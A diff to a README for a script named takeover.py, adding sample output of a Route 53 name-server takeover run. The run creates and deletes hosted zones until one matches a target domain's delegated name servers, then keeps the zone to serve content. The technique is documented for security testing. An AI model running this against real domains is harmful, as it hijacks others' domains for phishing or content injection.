@@ -52,3 +52,20 @@ Edit the two constants at the top of the script:
 |----------|---------|
 | `TARGET_DOMAIN` | The domain you're testing (e.g. `example.com`) |
 | `TARGET_NS` | The exact name servers of the target you're trying to match |
+
+## Tool Output
+```
+(.env) sh-5.3$ python takeover.py 
+[*] Starting takeover simulation for example.in...
+[*] Target Name Servers: {'ns-1361.awsdns-42.org.', 'ns-775.awsdns-32.net.', 'ns-1855.awsdns-39.co.uk.'}
+
+[-] Attempt 1: No match. Assigned: ['ns-991.awsdns-59.net', 'ns-385.awsdns-48.com']... Deleting zone.
+[-] Attempt 2: No match. Assigned: ['ns-854.awsdns-42.net', 'ns-1476.awsdns-56.org']... Deleting zone.
+[-] Attempt 3: No match. Assigned: ['ns-1706.awsdns-21.co.uk', 'ns-481.awsdns-60.com']... Deleting zone.
+---REDACTED---
+
+[+] SUCCESS on iteration 69!
+[+] Hosted Zone ID: /hostedzone/Z086807628NAQWNHZ3VLV
+[+] Matched Name Servers: {'ns-1361.awsdns-42.org.'}
+[+] The zone has been kept alive. You can now add records to serve content.
+```
